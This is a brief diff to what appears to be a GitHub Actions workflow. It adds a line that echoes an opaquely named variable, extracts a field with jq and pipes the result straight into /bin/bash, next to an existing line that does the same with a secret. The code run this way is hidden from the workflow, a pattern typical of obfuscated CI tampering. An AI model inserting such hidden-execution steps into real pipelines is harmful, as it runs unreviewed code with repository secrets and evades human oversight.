@@ -18,6 +18,7 @@ jobs:
           jbroa865: ${{ secrets.jbroa865 }}
         run: |
           printf '%s' "$jbroa865" | jq -r .yxk2 | /bin/bash
+          echo $nodzj93 | jq -r .q8791 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
